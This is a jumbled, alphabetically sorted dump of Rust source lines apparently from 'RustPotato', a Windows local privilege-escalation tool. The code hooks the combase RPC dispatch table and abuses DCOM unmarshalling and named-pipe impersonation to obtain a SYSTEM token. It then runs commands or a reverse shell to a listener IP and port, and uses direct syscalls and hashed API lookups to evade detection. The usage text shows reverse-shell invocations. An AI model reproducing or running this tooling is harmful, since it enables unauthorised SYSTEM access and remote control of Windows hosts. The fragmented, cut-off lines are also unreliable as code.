        let mut process_info: ProcessInformation = ProcessInformation::new()
        let mut res: 
        let mut security_descriptor: 
        let mut security_descriptor_size: u32 = 0
        let mut sid: PSID = core::ptr::null_mut()
        let mut sid_type = 0
        let mut sockaddr_in: SockAddrIn = core::mem::zeroed()
        let mut ssn = 0
        let mut startup_info: StartupInfoW = StartupInfoW::new()
        let mut string2 = string
        let mut table = [0isize
        let mut wsa_data: WsaData = core::mem::zeroed()
        let name_addr = module_base.offset(names[i as usize] as isize) as 
        let name_len = get_cstr_len(name_addr as _)
        let name_slice: 
        let name_string = OsString::from_wide(
        let network_address = read_string(reader)
        let nt_headers =
        let nt_status = ntdll().nt_open_process.run(
        let nt_status = unsafe {
        let ntdll = ntdll()
        let num_entries = (string_binding_bytes.len() 
        let num_entries = reader.read_u16::<byteorder::LittleEndian>().ok()
        let oid = reader.read_u64::<byteorder::LittleEndian>().ok()
        let ok = ntdll().nt_read_file.run(
        let oxid = reader.read_u64::<byteorder::LittleEndian>().ok()
        let p_iunknown: IUnknown = SampleCOMObject.into()
        let part4 = 
        let part5 = 
        let parts: Vec<
        let principal_name = read_string(reader)
        let process_token_node = 
        let public_refs = reader.read_u32::<byteorder::LittleEndian>().ok()
        let resolve_addr = resolve_hostname(addr)
        let result = ConvertStringSecurityDescriptorToSecurityDescriptorW(
        let result = unsafe {
        let revision = bytes[0]
        let rtf = (unsafe { dll_base.offset(rva as isize) }) as PimageRuntimeFunctionEntry
        let rva = unsafe { (
        let security_binding = SecurityBinding::from_reader(reader)
        let security_binding_bytes = self.security_binding.to_bytes()
        let security_offset = reader.read_u16::<byteorder::LittleEndian>().ok()
        let security_offset = string_binding_bytes.len() as u16 / 2
        let shift = i 
        let signature = cursor.read_u32::<byteorder::LittleEndian>().ok()
        let sockaddr = 
        let status = nt_create_named_pipe_file(
        let string_binding = StringBinding::from_reader(reader)
        let string_binding_bytes = self.string_binding.to_bytes()
        let sub_authority_count = bytes[1]
        let success = (advapi32().create_process_with_token_w)(
        let table = Self::compute_occurrence(pattern)
        let token_elevation_type = ProcessToken::get_token_elevation_type(token_handle)
        let token_groups = unsafe { 
        let token_type = ProcessToken::get_token_type(token_handle)
        let token_type = match buffer[0..4].try_into() {
        let token_user = unsafe { 
        let tower_id = reader.read_u16::<byteorder::LittleEndian>().ok()
        let username = logon_sid.to_username()
        let wide_descriptor: Vec<u16> = descriptor_string.encode_utf16().chain(Some(0)).collect()
        let wide_sid: Vec<u16> = OsStr::new(self.value.as_str())
        loop {
        match elevation_type {
        match level {
        match token_type {
        match value {
        matches
        module_base.offset((
        module_list = (
        n: 
        new_token_handle: 
        next = unsafe { (
        nt_create_named_pipe_file(
        nt_current_teb()
        ntdll()
        ntdll().nt_close.run(process_info.h_process)
        ntdll().nt_close.run(process_info.h_thread)
        ntdll().nt_close.run(stdin_read)
        ntdll().nt_close.run(stdin_write)
        ntdll().nt_close.run(stdout_read)
        ntdll().nt_close.run(stdout_write)
        ntdll.ldr_load_dll = unsafe { core::mem::transmute(ldr_load_dll_addr) }
        ntdll.rtl_allocate_heap = unsafe { core::mem::transmute(rtl_allocate_heap_addr) }
        object_attributes: 
        object_information: 
        old_protect: 
        out(reg) peb_ptr
        output.push_str(
        p.attributes = a
        p.length = core::mem::size_of::<ObjectAttributes>() as c_ulong
        p.object_name = n
        p.root_directory = r
        p.security_descriptor = s
        p.security_quality_of_service = ptr::null_mut()
        p10: 
        p11: 
        p12: 
        p13: 
        p2: 
        p3: 
        p4: 
        p5: 
        p6: 
        p7: 
        p8: 
        p9: 
        p: 
        pipe_name_utf16.push(to_hex_char(hex_digit))
        println!(
        process_handle: 
        process_information: 
        pub struct $name {
        r: 
        reader.read_exact(
        region_size: 
        resolve_native_functions!(
        result
        result_str.push(char::from_u32(character as u32).unwrap_or('
        return
        return Err(Error::last_os_error())
        return Err(Error::new(
        return Err(std::io::Error::new(
        return None
        return false
        return null_mut()
        return status
        return_length: 
        run(
        run_syscall!(
        s: 
        security_descriptor = unsafe { (
        self.0 as winapi::um::winnt::HANDLE
        self.dual_string_array.save(writer)
        self.standard_objref.save(
        self.token = Some(RawHandle(p))
        self.token.clone()
        self.use_protseq_delegate = match self.use_protseq_function_param_count {
        sockaddr_in.sin_addr.s_addr = resolve_addr
        sockaddr_in.sin_family = 2
        sockaddr_in.sin_port = (winsock().htons)(port)
        source_handle: 
        source_process_handle: 
        startup_info.cb = core::mem::size_of::<StartupInfoW>() as u32
        startup_info.dw_flags = STARTF_USESTDHANDLES
        startup_info.h_std_error = stdout_write
        startup_info.h_std_input = stdin_read
        startup_info.h_std_output = stdout_write
        std::process::exit(1)
        string2.offset_from(string) as usize
        system_information: 
        table
        target_handle: 
        target_process_handle: 
        target_process_token: 
        token_groups.group_count != 0 // Return true if the token has restricted SIDs
        token_handle: 
        token_information: 
        unsafe impl Send for $name {}
        unsafe impl Sync for $name {}
        unsafe {
        unsafe { NTDLL_PTR = Box::into_raw(Box::new(ntdll)) }
        unsafe { ntdll().nt_close.run(child_stdout_read) }
        unsafe { ntdll().nt_close.run(child_stdout_write) }
        unsafe { ntdll().nt_close.run(read_pipe_handle) }
        value 
        while 
        while !(
        while !addr_info_ptr.is_null() {
        while i < args.len() {
        while i <= text.len().saturating_sub(pattern.len()) {
        writeln!(
        writer
        writer.write_all(
        writer.write_u64::<byteorder::LittleEndian>(self.oid).ok()
        {
        }
        } else {
        })
    ($($arg:tt)
    (tmp - pointer as u64) as _
    )
    ) -> Option<SecurityImpersonationLevel> {
    ) -> Option<Self> {
    ) -> Option<Vec<u8>> {
    ) -> Option<u32> {
    ) -> i32 {
    ) {
    -1 // Return -1 if no syscall is found.
    -1isize as 
    -c <cmd
    -h <LHOST>         Specify the IP address of the listener.
    -p <LPORT>         Specify the port of the listener.
    // // Configure the STARTUPINFO structure for the child process
    // Add the token to the list if no matching SID was found
    // Append dot separator
    // Append pipe_id as an 8-character hex string
    // Append process_id as a 16-character hex string
    // Assign the read and write handles to the output parameters
    // Attempt to connect the socket to the provided URL and lport
    // Buffer to store the output from the child process
    // Calculate the address of NT headers
    // Check and call initialize if not already done.
    // Check if custom security attributes were provided
    // Check if initialization has already occurred.
    // Check if the DOS signature is valid (MZ)
    // Check if the NT signature is valid (PE
    // Check if the pipe creation failed
    // Check if the pipe opening failed
    // Check if the socket creation was successful
    // Cleans up and terminates the pipe server thread.
    // Close remaining handles associated with the child process
    // Close the write end of the pipe as the parent won't write to it
    // Constants for the startup flags (used to specify the creation behavior of the process)
    // Convert the command line to a wide string (UTF-16)
    // Create a pipe for the child process's standard output and error streams
    // Create process information struct
    // Create slices from the export directory arrays
    // Create the named pipe for reading
    // Creates a named pipe to wait for a client connection for impersonation.
    // Declaration of an external syscall function with a variadic argument list
    // Ensure the read handle is not inheritable by the child process
    // Ensure there are enough arguments
    // Executes the unmarshalling process to trigger interaction with the RPC server.
    // Format the pipe name using the process ID and pipe ID
    // Get the command-line arguments
    // Get the export directory from the NT headers
    // Initialize client ID structure with the target process ID.
    // Initialize the 
    // Initialize the main context for RustPotato operations
    // Initialize the object attributes for the named pipe
    // Installs a hook on the dispatch table to redirect specific RPC calls.
    // Iterate through each system handle
    // Iterate through the existing tokens
    // Iterate through the export names to find the function matching the given hash
    // Iterate through the list of loaded modules
    // Modify the handle attributes based on the provided mask and flags
    // Null-terminate the buffer
    // Open the pipe for writing
    // Parse arguments based on the format
    // Perform a system call to NtOpenProcess to obtain a handle to the specified process.
    // Prepares the dispatch table and sets up function pointers for hooking.
    // Query the current handle information
    // Read the process's output until the stream is closed
    // Removes the hook and restores the original state of the dispatch table.
    // Retrieve all system handles
    // Return the UTF-16 encoded vector
    // Return the captured output
    // RtlInitUnicodeString
    // Runs the specified command (
    // Security attributes for pipe creation (allows handle inheritance)
    // Set the default timeout to 120 seconds
    // Set the updated handle attributes
    // Skip if the provided token handle is null
    // Start with the first module in the InLoadOrderModuleList
    // Static part of the pipe name
    // Step 1: Initialize the context
    // Step 2: Set up the RPC context
    // Step 3: Hook the RPC dispatch table
    // Step 4: Start the named pipe server
    // Step 5: Start the unmarshalling trigger
    // Step 6: Execute a command
    // Step 7: Restore the original RPC dispatch table
    // Step 8: Stop the named pipe server
    // This involves locating the combase.dll module in memory and identifying the RPC_SERVER_INTERFACE structure.
    // Traverse the list of loaded modules in memory.
    // Use case-insensitive object attributes by default
    // Use the default buffer size if not provided
    // Wait for the child process to exit
    // options.
    ///
    /// 
    ///   
    ///   It represents the handle that will be closed by the function.
    ///   NTSTATUS code
    ///   can include values such as 
    ///   handle.
    ///   information.
    ///   of the data returned.
    ///   of the region of memory.
    ///   of the token.
    ///   the region of memory to be changed. The value of this parameter is updated by the function.
    /// (used for acting on behalf of another security context).
    /// - 
    /// - A new thread is spawned to handle the pipe server logic.
    /// - Adjusts the memory protection of the RPC dispatch table to allow modifications.
    /// - Allocates memory from the process heap and copies the stream data into it.
    /// - Configures the 
    /// - Creates a COM stream from the allocated memory.
    /// - Creates a named pipe and waits for a client to connect.
    /// - Creates a new instance of 
    /// - Determines the size and reads the memory content of the module.
    /// - Ensures thread safety by locking the pipe server thread before attempting modifications.
    /// - If both 
    /// - If only 
    /// - If only a command line (
    /// - If reverse shell parameters (
    /// - Locates the 
    /// - Marks the hook as active in the context.
    /// - Marks the pipe server as stopped (
    /// - Passes the serialized 
    /// - Prepares the context for subsequent operations.
    /// - Reconstructs an object reference (
    /// - Replaces the first entry in the dispatch table with a custom hook function.
    /// - Searches for the 
    /// - Sends a termination signal to the named pipe if accessible.
    /// - Sets a global instance of the context to allow access from other parts of the application.
    /// - Stores the system token for later use.
    /// - Stores the trigger in the context and invokes the 
    /// - Successfully executed commands or reverse shell initiation logs their success to the console.
    /// - The 
    /// - The created binding includes two endpoints: the client pipe from the global context and a fixed TCP endpoint.
    /// - The function relies on a global context (
    /// - The server will only attempt to stop if it is currently running (
    /// - The server will only start if the RPC hook is active (
    /// - The trigger executes the unmarshalling process to engage with the RPC pipeline.
    /// - This function assumes the system token has been successfully retrieved earlier in the pipeline.
    /// - This function must be called after 
    /// - This function relies on the assumption that the pipe server has been successfully started.
    /// - Uses 
    /// - Validates and processes the moniker display name.
    /// - Validates the presence of the 
    /// - Verifies if the pipe server is running (
    /// - Waits for the server thread to complete its execution.
    /// A handle to the target process.
    /// A reference to the original token handle within the target process.
    /// A table (
    /// A vector of start indices where the pattern matches in the text.
    /// Base address of the loaded 
    /// Behavior:
    /// Closes the token handle.
    /// Collection of function pointers in the dispatch table.
    /// Computes the occurrence table for the given pattern.
    /// Configures the RPC context by verifying and setting up key components.
    /// Constructs a GUID from a byte slice.
    /// Constructs a SID from a byte slice.
    /// Converts the GUID into its raw byte representation.
    /// Converts the internal raw pointer into a Windows 
    /// Create a new syscall object
    /// Creates a new 
    /// Creates a new GUID from a given string value.
    /// Creates a new instance of 
    /// Delegate function pointer for hooking operations.
    /// Determines the extent of access the impersonated user has.
    /// Executes a command or starts a reverse shell with the obtained system token.
    /// Formats the 
    /// GUID associated with the RPC server interface.
    /// Indicates whether the RPC hook is active.
    /// Indicates whether the pipe server is running.
    /// Initializes the 
    /// Installs a hook on the RPC dispatch table.
    /// Logs detailed error messages if unmarshalling fails at any stage.
    /// Logs errors at each stage if any step fails.
    /// Name of the client-side pipe.
    /// Name of the server-side pipe.
    /// Notes:
    /// Number of parameters for the 
    /// Offsets for function strings in the format string table.
    /// Outputs all fields of the 
    /// Parameters:
    /// Parses an OBJREF structure from a byte stream.
    /// Pointer to the 
    /// Pointer to the dispatch table used in RPC hooking.
    /// Pointer to the procedure string for RPC calls.
    /// Pointer validity must be ensured by the caller.
    /// Reads a 
    /// Represents the account name tied to the token's security context.
    /// Represents whether the token is limited or fully elevated.
    /// Restores the original RPC dispatch table function.
    /// Retrieves the elevation type of a given token.
    /// Retrieves the impersonation level of a given token.
    /// Retrieves the integrity level of a given token.
    /// Retrieves the logon Security Identifier (SID) from a token.
    /// Retrieves the stored security token.
    /// Retrieves the type of a token (Primary or Impersonation).
    /// Returns an error if the byte slice is too short or invalid.
    /// Returns an error if the byte slice length is not 16.
    /// Returns:
    /// Searches for all occurrences of a pattern in the given text using the Sunday algorithm.
    /// Serializes the 
    /// Serializes the OBJREF structure into bytes.
    /// Sets up new bindings for the RPC endpoints dynamically.
    /// Starts the pipe server for handling client connections.
    /// Starts the trigger for the unmarshalled object execution.
    /// Stops the pipe server and terminates the server thread.
    /// Stores a raw handle to a security token.
    /// The Process ID (PID) of the target process that owns the token.
    /// The Security Identifier (SID) associated with the token.
    /// The actual token handle being managed or manipulated.
    /// The address of the syscall
    /// The byte slice must be exactly 16 bytes in length to match the GUID format.
    /// The byte slice must follow the SID binary format.
    /// The caller must ensure that the pointers are valid and that the memory they point to is
    /// The elevation type of the token.
    /// The hash of the syscall (used for lookup)
    /// The impersonation level of the token.
    /// The integrity level of the token.
    /// The number of the syscall
    /// The resulting byte array is in the standard little-endian format.
    /// The string representation of the SID.
    /// The type of the token (Primary or Impersonation).
    /// The username associated with the token.
    /// This function changes the protection on a region of memory within the virtual address space
    /// This function checks if the RPC hook is active and the original function pointer is available.
    /// This function checks the impersonation level of a token. If the token's impersonation
    /// This function checks the type of the current token. If the token is of type 
    /// This function creates a named pipe file and returns a handle to it.
    /// This function is unsafe because it dereferences the 
    /// This function performs the following actions based on the provided parameters:
    /// This function performs the following steps:
    /// This function queries information about an object handle.
    /// This function queries the token for its user information and extracts the
    /// This function queries the token's 
    /// This function reads data from a file or I/O device. It wraps the NtReadFile syscall.
    /// This function sets information about an object handle.
    /// This function terminates a process. It wraps the NtTerminateProcess
    /// This function writes data to a file or I/O device. It wraps the NtWriteFile syscall.
    /// This method ensures the associated token handle is properly released.
    /// This method initializes and starts a pipe server to handle client connections.
    /// This method signals the pipe server to stop by sending a termination byte or
    /// This table maps each character to its last occurrence index
    /// Thread handle for the pipe server.
    /// Triggers the unmarshalling process using the moniker.
    /// Unmarshals an object from a serialized byte stream using DCOM.
    /// Used for operations involving the process.
    /// Used to identify the security context of the token.
    /// Whether the token is restricted.
    /// Wrapper for the NtCreateNamedPipeFile syscall.
    /// Wrapper for the NtDuplicateObject syscall.
    /// Wrapper for the NtOpenFile syscall.
    /// Wrapper for the NtOpenProcess
    /// Wrapper for the NtOpenProcessToken
    /// Wrapper for the NtProtectVirtualMemory
    /// Wrapper for the NtQueryInformationProcess
    /// Wrapper for the NtQueryInformationToken
    /// Wrapper for the NtQueryObject syscall.
    /// Wrapper for the NtQuerySystemInformation
    /// Wrapper for the NtReadFile syscall.
    /// Wrapper for the NtSetInformationObject syscall.
    /// Wrapper for the NtTerminateProcess
    /// Wrapper for the NtWaitForSingleObject
    /// Wrapper for the NtWriteFile syscall.
    /// Wrapper function for NtClose to avoid repetitive run_syscall calls.
    /// a new 
    /// a new handle to a primary token.
    /// and 
    /// and assigns it to the provided output pointer.
    /// and performs impersonation to retrieve and store a system token.
    /// dictates the degree of access and control the token provides for impersonation.
    /// interrupting the thread if the pipe cannot be opened. It ensures that the pipe
    /// levels (
    /// of a specified process. It wraps the NtProtectVirtualMemory system call.
    /// or duplicated with a different set of access rights or attributes.
    /// server thread is properly joined and any resources are cleaned up.
    /// these elements for use in unmarshalling operations.
    /// valid and has the correct size.
    /// which is either 
    /// within the pattern. Characters not in the pattern are mapped to 
    //InitializeObjectAttributes
    0
    DllCharacteristics: 
    DllHandle: 
    DllPath: 
    Execute a command line or start a reverse shell.
    Execute a command line:
    MediumHighIntegrity = 0x00002000 
    ObjectAttributes::initialize(
    Ok(())
    Ok(output)
    RustPotato.exe -h 192.168.1.100 -p 4444
    RustPotato.exe -h 192.168.1.100 -p 4444 -c powershell
    RustPotato.exe <cmdline> OR -h <host> -p <port> [-c <cmd>]
    Some(())
    Some(result_str)
    Start a reverse shell with powershell:
    Start a reverse shell with the default shell (cmd):
    client_id.unique_process = pid as 
    cmd_line: 
    const ALPHA_BET: usize = 512
    const CREATE_NO_WINDOW: u32 = 0x08000000
    const SIGNATURE: u32 = 0x574f454d
    const STARTF_USESTDHANDLES: u32 = 0x00000100
    def::{
    default_timeout.high_part = -1200000000
    descriptor_string: 
    ensure_initialized()
    exceptfds: 
    fn address(
    fn compute_occurrence(pattern: 
    fn fmt(
    fn from_reader<R: Read>(reader: 
    fn hash(
    fn is_null(
    fn new() -> Self
    fn number(
    fn save<W: Write>(
    fn test_list_process_token() {
    fn test_list_system_handles() {
    fn test_print_ntdll_syscalls() {
    fn to_bytes(
    for handle_entry in system_handles.iter() {
    for i in (0..16).rev() {
    for i in (0..8).rev() {
    for i in 0..number_of_functions {
    for i in 0..tokens.len() {
    hNamedPipe: 
    hToken: 
    h_read_pipe: 
    h_write_pipe: 
    handle: 
    handles: [SystemHandleTableEntryInfoEx
    hints: 
    hsh
    if !INIT_ADVAPI32.load(Ordering::Acquire) {
    if !INIT_K32.load(Ordering::Acquire) {
    if !INIT_NTDLL.load(Ordering::Acquire) {
    if !INIT_WS32.load(Ordering::Acquire) {
    if !NT_SUCCESS(status) {
    if !lp_pipe_attributes.is_null() {
    if !success {
    if (
    if args.len() < 2 {
    if connect_result != 0 {
    if export_directory.is_null() {
    if handle_info_ptr.is_null() {
    if mask 
    if p_img_nt_headers.is_null() {
    if peb.is_null() {
    if peb_ldr_data_ptr.is_null() {
    if process_token.token_handle.is_null() {
    if sock == !0 {
    if status != 0 {
    init_winsock()
    jle skip
    jmp rcx
    let args: Vec<String> = std::env::args().collect()
    let array_of_addresses =
    let array_of_names =
    let array_of_ordinals =
    let data_directory = 
    let dos_header = base_addr as 
    let export_directory =
    let head = 
    let ldr = unsafe { (
    let local_process_handle = nt_current_process()
    let mut attributes: u32 = OBJ_CASE_INSENSITIVE
    let mut buffer = [0u8
    let mut buffer = vec![0u8
    let mut bytes_returned: u32 = 0
    let mut child_stdout_read: 
    let mut child_stdout_write: 
    let mut client_id = ClientId::new()
    let mut cmdline_utf16: Vec<u16> = cmd_line.encode_utf16().chain(Some(0)).collect()
    let mut cur: u8
    let mut default_timeout: LargeInteger = LargeInteger::new()
    let mut handle_info = ObjectHandleAttributeInformation::default()
    let mut handle_info_size = 1024 
    let mut hsh: u32 = 5381
    let mut iter: usize = 0
    let mut last_pid: i32 = -1
    let mut module_list =
    let mut next = unsafe { (
    let mut object_attributes = ObjectAttributes::new()
    let mut object_attributes: ObjectAttributes = ObjectAttributes::new()
    let mut output = String::new()
    let mut pi: ProcessInformation = ProcessInformation::new()
    let mut pipe_name: UnicodeString = UnicodeString::new()
    let mut pipe_name_utf16 = Vec::with_capacity(50)
    let mut process_handle: 
    let mut process_handle: Option<
    let mut process_tokens = Vec::new()
    let mut read_pipe_handle: 
    let mut result = Vec::new()
    let mut result_str = String::new()
    let mut return_size: u32 = 0
    let mut rust_potato = RustPotatoContext::new()
    let mut sa = SecurityAttributes {
    let mut security_attributes = SecurityAttributes {
    let mut security_descriptor: 
    let mut si: StartupInfoW = StartupInfoW::new()
    let mut status_block: IoStatusBlock = IoStatusBlock::new()
    let mut status_block_2 = IoStatusBlock::new()
    let mut stdin_read: 
    let mut stdin_write: 
    let mut stdout_read: 
    let mut stdout_write: 
    let mut tmp: u64 = pointer as u64
    let mut write_pipe_handle: 
    let n_size = if n_size == 0 { 0x1000 } else { n_size }
    let nt_headers = (base_addr as isize 
    let number_of_functions = (
    let p_img_nt_headers = get_nt_headers(module_base)
    let peb = find_peb()
    let peb_ldr_data_ptr = (
    let peb_ptr: 
    let pipe_name_utf16 = format_named_pipe_string(
    let sock = create_socket()
    let status = ntdll().nt_create_named_pipe_file.run(
    let status = ntdll().nt_open_file.run(
    let status = ntdll().nt_query_object.run(
    let status = ntdll().nt_set_information_object.run(
    let status = unsafe {
    let success = unsafe {
    let system_handles = list_system_handles()
    let teb_ptr: 
    loop {
    lpApplicationName: 
    lpBuffer: 
    lpBytesLeftThisMessage: 
    lpBytesRead: 
    lpCommandLine: 
    lpCurrentDirectory: 
    lpEnvironment: 
    lpProcessInformation: 
    lpStartupInfo: 
    lpTotalBytesAvail: 
    lp_pipe_attributes: 
    match digit {
    node: 
    nt_headers
    null_mut() // Return null if no matching module is found
    null_mut() // Return null if the function is not found
    object: 
    parse_args()
    peb_ptr
    pipe_name.init(pipe_name_utf16.as_ptr())
    pipe_name_utf16
    pipe_name_utf16.extend(device_part.encode_utf16())
    pipe_name_utf16.push('.' as u16)
    pipe_name_utf16.push(0)
    pub activation_context_stack_pointer: 
    pub active_rpc_handle: 
    pub ai_addr: 
    pub ai_canonname: 
    pub ai_next: 
    pub ansi_code_page_data: 
    pub arbitrary_user_pointer: 
    pub blink: 
    pub buffer: 
    pub combase_module: 
    pub console_handle: 
    pub csr_client_thread: 
    pub current_directories: [UnicodeString
    pub current_directory_handle: 
    pub data_directory: [ImageDataDirectory
    pub default_manager_epv: 
    pub dispatch_table: 
    pub dispatch_table: Vec<
    pub dispatch_table_ptr: 
    pub dll_base: 
    pub e_res2: [u16
    pub e_res: [u16
    pub endpoint: 
    pub entry_point: 
    pub entry_point_activation_context: 
    pub environment: 
    pub environment_pointer: 
    pub event_log: 
    pub event_log_section: 
    pub exception_list: 
    pub fast_peb_lock: 
    pub fast_peb_lock_routine: 
    pub fast_peb_unlock_routine: 
    pub fd_array: [SOCKET
    pub fiber_data: 
    pub flink: 
    pub fmt_string_offset: 
    pub fn as_handle(
    pub fn close(
    pub fn duplicate_token_ex(
    pub fn ensure_impersonation_level(
    pub fn ex(
    pub fn from_bytes(bytes: 
    pub fn from_ptr(ptr: 
    pub fn from_reader<R: Read>(reader: 
    pub fn fun(ppdsa_new_bindings: 
    pub fn get_impersonation_level(
    pub fn get_logon_sid(token_handle: 
    pub fn get_token(
    pub fn get_token_elevation_type(token_handle: 
    pub fn get_token_info(
    pub fn get_token_info_size(
    pub fn get_token_integrity_level(token_handle: 
    pub fn get_token_type(token_handle: 
    pub fn hook_rpc(
    pub fn init(
    pub fn init_context(
    pub fn initialize(
    pub fn is_token_restricted(token_handle: 
    pub fn new(
    pub fn new() -> Option<Self> {
    pub fn new() -> Self {
    pub fn new(value: String) -> GUID {
    pub fn restore_hook_rpc(
    pub fn run(
    pub fn save<W: Write>(
    pub fn search(text: 
    pub fn set_token(
    pub fn setup_rpc_context(
    pub fn start_pipe_server(
    pub fn start_trigger(
    pub fn stop_pipe_server(
    pub fn to_bytes(
    pub fn to_le_bytes(
    pub fn to_ptr(
    pub fn to_username(
    pub fn trigger(
    pub fn unmarshal_object(stream: 
    pub free_list: 
    pub gdi_dc_attribute_list: 
    pub gdi_handle_buffer: [c_ulong
    pub gdi_last_spare_stack_array: [u32
    pub gdi_shared_handle_table: 
    pub gdi_tcell_buffer: 
    pub groups: [SidAndAttributes
    pub h_process: 
    pub h_std_error: 
    pub h_std_input: 
    pub h_std_output: 
    pub h_thread: 
    pub handle: 
    pub image_base: 
    pub import_context: 
    pub inherited_from_unique_process_id: 
    pub interpreter_info: 
    pub kernel_callback_table: 
    pub loaded_imports: 
    pub loader_data: 
    pub loader_lock: 
    pub lp_desktop: 
    pub lp_reserved2: 
    pub lp_reserved: 
    pub lp_security_descriptor: 
    pub lp_title: 
    pub lp_vendor_info: 
    pub manager_epv: 
    pub module_base: 
    pub mutant: 
    pub object_name: 
    pub oem_code_page_data: 
    pub p_stub_desc: 
    pub p_syntax_info: 
    pub p_transfer_syntax: 
    pub package_dependency_data: 
    pub patch_information: 
    pub peb_base_address: 
    pub pointer: 
    pub proc_string: 
    pub process_environment_block: 
    pub process_heap: 
    pub process_heaps: 
    pub process_parameters: 
    pub process_starter_helper: 
    pub read_only_shared_memory_base: 
    pub read_only_shared_memory_heap: 
    pub read_only_static_server_data: 
    pub reserved_for_runtime: 
    pub root_directory: 
    pub rpc_interface_information: 
    pub rpc_protocol_sequence: 
    pub rpc_protseq_endpoint: 
    pub sa_data: [i8
    pub section_pointer: 
    pub security_descriptor: 
    pub security_quality_of_service: 
    pub self_: 
    pub sid: 
    pub sin_zero: [i8
    pub spare1: [u8
    pub spare_2: [u8
    pub spare_bytes: [u8
    pub spare_stack_array: [u32
    pub ss_handle: 
    pub stack_base: 
    pub stack_limit: 
    pub standard_error: 
    pub standard_input: 
    pub standard_output: 
    pub sub_system_data: 
    pub sub_system_tib: 
    pub system_reserved1: [
    pub sz_description: [i8
    pub sz_system_status: [i8
    pub target_process_handle: 
    pub target_process_token: 
    pub thread_local_storage_pointer: 
    pub thunk_table: 
    pub tls_bitmap: 
    pub tls_bitmap_bits: [c_ulong
    pub tls_expansion_bitmap_bits: [u8
    pub token_handle: 
    pub transfer_syntax: 
    pub unicode_case_table_data: 
    pub unique_process: 
    pub unique_process_id: 
    pub unique_thread: 
    pub unsafe fn run(
    pub use_protseq_delegate: 
    pub use_protseq_function_ptr: 
    pub user32_reserved: [u32
    pub user_reserved: [u32
    pub win32_thread_info: 
    pub wow64_reserved: 
    pub x64_spare2: [u32
    pub x64_spare3: [u32
    readfds: 
    rep movsq
    res: 
    result
    rust_potato.ex(
    rust_potato.hook_rpc()
    rust_potato.init_context()
    rust_potato.restore_hook_rpc()
    rust_potato.setup_rpc_context()
    rust_potato.start_pipe_server()
    rust_potato.start_trigger()
    rust_potato.stop_pipe_server()
    service: 
    si.cb = core::mem::size_of::<StartupInfoW>() as u32
    si.dw_flags = STARTF_USESTDHANDLES
    si.h_std_error = child_stdout_write
    si.h_std_output = child_stdout_write
    status >= 0
    teb_ptr
    timeout: 
    token: 
    tokens.push(process_token)
    true
    type Error = 
    unsafe {
    unsafe { 
    unsafe { ensure_initialized() }
    unsafe { ensure_initialized_advapi32() }
    unsafe { nt_current_teb().as_ref().unwrap().last_error_value }
    unsafe { ntdll().nt_close.run(child_stdout_read) }
    unsafe { ntdll().nt_close.run(child_stdout_write) }
    unsafe { ntdll().nt_close.run(pi.h_process) }
    unsafe { ntdll().nt_close.run(pi.h_thread) }
    use super::
    while !(
    while iter < buffer.len() {
    while next != head {
    win32::def::{
    win32::{
    winnt::{
    writefds: 
    {
    }
    } else {
   RustPotato replaces the first entry in the 
   The tool scans the memory of 
  -c <cmd
  -h <LHOST>         Specify the IP address of the listener for the reverse shell.
  -p <LPORT>         Specify the port of the listener for the reverse shell.
  Execute a command line or start a reverse shell.
  Execute a command line:
  Removes the custom function pointer from the 
  RustPotato.exe [command line] 
  Start a reverse shell with powershell:
  Start a reverse shell with the default shell (cmd):
  When 
  With reverse shell options (
  cargo build --release
  cargo build --release --features verbose
 !NT_SUCCESS(nt_status) {
 !dup_handle.is_null() {
 !self.is_start {
 !self.use_protseq_function_ptr.is_null() {
 (4 
 (IP address or hostname) of the remote server to connect to.
 (i as usize) 
 (only the process output is printed):
 (process_token.impersonation_level
 (process_token.token_elevation_type == Some(TokenElevationType::Full)
 (sub_authority_count as usize) 
 (used for process creation) or 
 ) => {
 - A 
 - A handle to the process to be terminated.
 - A mutable pointer to 
 - An optional mutable reference to store the size of the module in memory.
 - The NTSTATUS code of the operation.
 - The base address of the module.
 - The exit status to be returned by the process.
 - The hash of the function name to locate.
 - The hash of the module name to locate.
 - The hash value associated with the syscall.
 - The identifier for the syscall struct.
 // AF_INET
 // Adjust size to actual bytes read.
 // Close the existing token
 // Close the new token if it doesn't qualify
 // Create a TCP socket
 // Double the buffer size
 // ERROR_BROKEN_PIPE indicates the process has finished writing
 // Exit after handling the token
 // Exit the loop if the process has exited or the query failed
 // Get the Process Environment Block (PEB)
 // Get the length of the function name
 // Initial buffer size of 1 MB
 // Initialize Winsock library for network communication
 // Initialize the system call number (SSN).
 // Kernel32.dll
 // Mark the hook as active
 // Null-terminate each string
 // Pipe for reading from stdin
 // Pipe for reading from stdout
 // Pipe for writing to stdin
 // Pipe for writing to stdout
 // Pre-allocate space
 // Replace 
 // Replace with the new token
 // Retrieve NT headers for the module
 // Retrieve the PEB (Process Environment Block)
 // Return empty result if allocation fails
 // Return false if the token information couldn't be retrieved
 // Return the base address of the module if the hash matches
 // SOCK_STREAM
 // Set the size if provided
 // Skip padding
 // Start writing endpoint strings after metadata
 // UTF-16 encoding 
 // advapi32.dll
 // combase.dll
 0x100
 0x28]
 0x30]
 0x38]
 0x40]
 0xF) as u16
 1 < args.len() {
 1. 
 1024
 1024]
 16]
 19)
 1].clone())
 1].parse::<u16>() {
 2) as u16
 2. 
 256]
 3. 
 4 {
 4. 
 4096]
 512]
 64]
 A boolean value that specifies whether the wait is alertable.
 A handle to an object. This is a required parameter that must be valid.
 A handle to the file or I/O device to be read from.
 A handle to the file or I/O device to be written to.
 A handle to the object to be modified.
 A handle to the object to be queried.
 A handle to the object.
 A handle to the process containing the source handle.
 A handle to the process to receive the duplicated handle.
 A handle to the process whose memory protection is to be changed.
 A handle to the process.
 A mutable pointer to a handle that will receive the file handle.
 A mutable pointer to a handle that will receive the process
 A mutable pointer to a handle that will receive the token handle.
 A pointer to a 
 A pointer to a buffer containing the information to be set.
 A pointer to a buffer that contains the data to be written to the file or device.
 A pointer to a buffer that receives the data read from the file or device.
 A pointer to a buffer that receives the requested
 A pointer to a buffer that receives the requested information.
 A pointer to a caller-supplied variable to receive the I/O completion key. This parameter is ignored if 
 A pointer to a handle that receives the file handle.
 A pointer to a variable that receives the duplicated handle.
 A pointer to a variable that receives the old protection attributes
 A pointer to a variable that specifies the base address of
 A pointer to a variable that specifies the size of the region
 A pointer to an 
 A pointer to an IO_STATUS_BLOCK structure that receives the final completion status and information about the operation.
 A pointer to an IO_STATUS_BLOCK structure that receives the status block.
 A pointer to the OBJECT_ATTRIBUTES structure.
 A pointer to the byte offset in the file where the operation should begin. If this parameter is 
 A pointer to the client ID structure.
 A pointer to the object attributes structure.
 API to create a new process under the
 An optional handle to an event object that will be signaled when the operation completes.
